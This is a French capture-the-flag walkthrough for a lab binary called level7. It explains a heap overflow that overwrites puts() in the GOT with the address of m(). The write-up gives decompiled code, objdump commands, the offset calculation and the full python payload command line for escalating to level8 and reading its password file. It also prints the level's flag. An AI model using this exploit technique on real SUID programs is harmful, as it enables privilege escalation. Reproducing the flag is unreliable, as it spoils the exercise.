# Level7 - Walkthrough

## Objectif
Exploiter un heap buffer overflow avec double indirection pour écrire l'adresse de `m()` dans la GOT de `puts()` et afficher le flag.

**Technique** : Heap Overflow + GOT Overwrite via Double Indirection

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level8 users  5648 Mar  6  2016 level7
# ⚠️ Bit SUID actif → s'exécute avec les droits de level8

./level7
# Segmentation fault

./level7 test
# Segmentation fault

./level7 test arg2
# ~~
```

Le programme nécessite **2 arguments**.

### 2. Analyse du code (Ghidra)

```c
char c[68];  // Variable globale

void m(void) {
    printf("%s - %d\n", c, time(NULL));  // Affiche le flag !
}

int main(int argc, char **argv) {
    int *struct_a = malloc(8);
    struct_a[0] = 1;
    void *buffer_a = malloc(8);
    struct_a[1] = buffer_a;      // struct_a[1] pointe vers buffer_a

    int *struct_b = malloc(8);
    struct_b[0] = 2;
    void *buffer_b = malloc(8);
    struct_b[1] = buffer_b;      // struct_b[1] pointe vers buffer_b

    strcpy(struct_a[1], argv[1]);  // ⚠️ Overflow possible
    strcpy(struct_b[1], argv[2]);  // ⚠️ Écrit où struct_b[1] pointe

    FILE *file = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, file);            // Lit le flag dans c
    puts("~~");                    // ← On va détourner ça vers m()
}
```

**Stratégie** :
1. Overflow buffer_a → écrase struct_b[1] avec l'adresse GOT de puts
2. strcpy(struct_b[1], argv[2]) écrit argv[2] dans GOT[puts]
3. puts("~~") appelle m() à la place → m() affiche c

### 3. Trouver les adresses critiques

#### Adresse de `m()`
```bash
objdump -t level7 | grep " m$"
# 080484f4 g     F .text  m
```

#### Adresse de `puts()` dans la GOT
```bash
objdump -R level7 | grep puts
# 08049928 R_386_JUMP_SLOT   puts
```

### 4. Calculer l'offset

**Layout du heap** :
```
0x0804a018  Buffer A (8 bytes)        ← strcpy(argv[1]) écrit ici
0x0804a020  Header Struct B (8 bytes)
0x0804a028  struct_b[0] (4 bytes)
0x0804a02c  struct_b[1] (4 bytes)     ← CIBLE !
```

**Offset = 20 bytes** (8 + 8 + 4)

### 5. Construction des payloads

#### Payload argv[1] : Préparer la cible
```
"A" × 20 + adresse_GOT_puts

Conversion little-endian :
0x08049928 → \x28\x99\x04\x08

Commande :
python -c 'print "A"*20 + "\x28\x99\x04\x08"'
```

**Effet** : struct_b[1] = 0x08049928 (GOT de puts)

#### Payload argv[2] : Écrire dans la GOT
```
adresse_de_m()

Conversion little-endian :
0x080484f4 → \xf4\x84\x04\x08

Commande :
python -c 'print "\xf4\x84\x04\x08"'
```

**Effet** : GOT[puts] = 0x080484f4 (adresse de m())

### 6. Exploitation

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

**Résultat** : Le flag s'affiche avec un timestamp.

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1711234567
```

---

## Flag
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

## Type de vulnérabilité
- Heap-based Buffer Overflow (CWE-122)
- Write-what-where Condition (CWE-123)
- GOT Overwrite via Double Indirection
- SUID privilege escalation (CWE-250)